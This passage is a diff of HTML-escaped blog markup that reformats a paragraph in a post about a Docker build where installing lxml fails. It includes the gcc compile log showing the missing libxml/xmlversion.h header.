 &lt;span class=&quot;k&quot;&gt;EXPOSE&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; 7100&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;and it didn’t work, because lxml installation was erroring for no reason
-&lt;em&gt;weird error I don’t understand&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;and it didn’t work, because lxml installation was erroring for no reason&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;weird error I don’t understand&lt;/em&gt;&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; gcc -Wno-unused-result -Wsign-compare -DNDEBUG -g -fwrapv -O3 -Wall -Os -fomit-frame-pointer -g -Os -fomit-frame-pointer -g -Os -fomit-frame-pointer -g -DTHREAD_STACK_SIZE=0x100000 -fPIC -DCYTHON_CLINE_IN_TRACEBACK=0 -Isrc -Isrc/lxml/includes -I/usr/include/python3.6m -c src/lxml/etree.c -o build/temp.linux-x86_64-3.6/src/lxml/etree.o -w
     In file included from src/lxml/etree.c:692:0:
     src/lxml/includes/etree_defs.h:14:31: fatal error: libxml/xmlversion.h: No such file or directory
